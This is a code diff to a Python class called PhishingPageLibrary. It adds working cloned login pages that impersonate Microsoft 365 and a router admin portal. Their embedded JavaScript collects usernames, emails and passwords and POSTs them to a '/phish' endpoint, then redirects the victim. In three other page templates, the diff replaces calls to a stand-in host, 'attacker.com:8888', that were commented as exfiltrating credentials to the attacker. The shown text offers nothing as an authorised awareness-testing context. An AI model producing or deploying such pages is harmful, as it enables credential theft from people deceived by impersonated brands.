@@ -44,6 +44,266 @@ class PhishingPageLibrary:
     """Pre-built phishing pages for popular services."""
 
     @staticmethod
+    def m365_clone_html(redirect_url: str) -> str:
+        """Cloned Microsoft 365 login page."""
+        return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {{
+            font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f2f2f2;
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d34a6960cc08e8b00.svg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }}
+        .login-box {{
+            background: #fff;
+            padding: 44px;
+            width: 360px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            border-radius: 0px;
+        }}
+        .logo {{
+            margin-bottom: 24px;
+            font-size: 24px;
+            font-weight: 600;
+            color: #737373;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }}
+        .microsoft-logo {{
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2px;
+            width: 18px;
+            height: 18px;
+        }}
+        .logo-tile {{
+            width: 8px;
+            height: 8px;
+        }}
+        h1 {{
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 0 0 12px 0;
+        }}
+        input[type="email"], input[type="password"] {{
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #666;
+            padding: 6px 0;
+            font-size: 16px;
+            margin-bottom: 20px;
+            outline: none;
+            box-sizing: border-box;
+        }}
+        input:focus {{
+            border-bottom: 2px solid #0067b8;
+        }}
+        .btn {{
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            min-width: 108px;
+            font-size: 15px;
+            cursor: pointer;
+            float: right;
+        }}
+        .btn:hover {{
+            background: #005da6;
+        }}
+        .clear {{
+            clear: both;
+        }}
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <div class="microsoft-logo">
+                <div class="logo-tile" style="background:#f25022;"></div>
+                <div class="logo-tile" style="background:#7fba00;"></div>
+                <div class="logo-tile" style="background:#00a4ef;"></div>
+                <div class="logo-tile" style="background:#ffb900;"></div>
+            </div>
+            <span style="font-size:18px;color:#737373;font-weight:500;">Microsoft</span>
+        </div>
+        <h1 id="title">Sign in</h1>
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <input type="email" id="email" placeholder="Email, phone, or Skype" required autocomplete="email">
+            <input type="password" id="password" placeholder="Password" style="display:none;" autocomplete="current-password">
+            <button type="submit" class="btn" id="submitBtn">Next</button>
+            <div class="clear"></div>
+        </form>
+    </div>
+
+    <script>
+    let stage = 'email';
+
+    function handleLogin(event) {{
+        event.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        if (stage === 'email') {{
+            if (!email) return;
+            sendCredentials({{ email: email }});
+            document.getElementById('password').style.display = 'block';
+            document.getElementById('password').required = true;
+            document.getElementById('password').focus();
+            document.getElementById('title').textContent = 'Enter password';
+            document.getElementById('submitBtn').textContent = 'Sign in';
+            stage = 'password';
+        }} else {{
+            if (!password) return;
+            sendCredentials({{ email: email, password: password }});
+            window.location.href = '{redirect_url}';
+        }}
+    }}
+
+    function sendCredentials(credentials) {{
+        fetch('/phish', {{
+            method: 'POST',
+            headers: {{'Content-Type': 'application/json'}},
+            body: JSON.stringify({{
+                target: 'Microsoft 365',
+                credentials: credentials,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            }})
+        }}).catch(() => {{}});
+    }}
+    </script>
+</body>
+</html>
+""";
+
+    @staticmethod
+    def generic_clone_html(redirect_url: str) -> str:
+        """Cloned generic router/portal login page."""
+        return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Router Admin Portal Login</title>
+    <style>
+        body {{
+            font-family: sans-serif;
+            background: #eceff1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }}
+        .login-card {{
+            background: #fff;
+            padding: 30px;
+            width: 320px;
+            border-radius: 4px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }}
+        h2 {{
+            margin-top: 0;
+            color: #37474f;
+            text-align: center;
+            font-size: 20px;
+        }}
+        .subtitle {{
+            font-size: 13px;
+            color: #78909c;
+            text-align: center;
+            margin-bottom: 24px;
+        }}
+        .form-group {{
+            margin-bottom: 16px;
+        }}
+        label {{
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            color: #455a64;
+            margin-bottom: 6px;
+        }}
+        input {{
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #cfd8dc;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }}
+        button {{
+            width: 100%;
+            background: #00796b;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+        }}
+        button:hover {{
+            background: #00695c;
+        }}
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <h2>Gateway Console</h2>
+        <div class="subtitle">Authorization Required</div>
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="admin" required autocomplete="username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required autocomplete="current-password">
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+    function handleLogin(event) {{
+        event.preventDefault();
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        fetch('/phish', {{
+            method: 'POST',
+            headers: {{'Content-Type': 'application/json'}},
+            body: JSON.stringify({{
+                target: 'Router Admin',
+                credentials: {{ username: user, password: pass }},
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            }})
+        }}).catch(() => {{}});
+
+        window.location.href = '{redirect_url}';
+    }}
+    </script>
+</body>
+</html>
+""";
+
+    @staticmethod
     def gmail_clone_html(redirect_url: str) -> str:
         """Cloned Gmail login page."""
         return f"""
@@ -224,7 +484,7 @@ class PhishingPageLibrary:
 
     function sendCredentials(credentials) {{
         // Exfiltrate credentials to attacker
-        fetch('http://attacker.com:8888/phish', {{
+        fetch('/phish', {{
             method: 'POST',
             headers: {{'Content-Type': 'application/json'}},
             body: JSON.stringify({{
@@ -402,7 +662,7 @@ class PhishingPageLibrary:
         const password = document.getElementById('password').value;
 
         // Send credentials to attacker
-        fetch('http://attacker.com:8888/phish', {{
+        fetch('/phish', {{
             method: 'POST',
             headers: {{'Content-Type': 'application/json'}},
             body: JSON.stringify({{
@@ -575,7 +835,7 @@ class PhishingPageLibrary:
         const password = document.getElementById('password').value;
 
         // Send to attacker
-        fetch('http://attacker.com:8888/phish', {{
+        fetch('/phish', {{
             method: 'POST',
             headers: {{'Content-Type': 'application/json'}},
             body: JSON.stringify({{
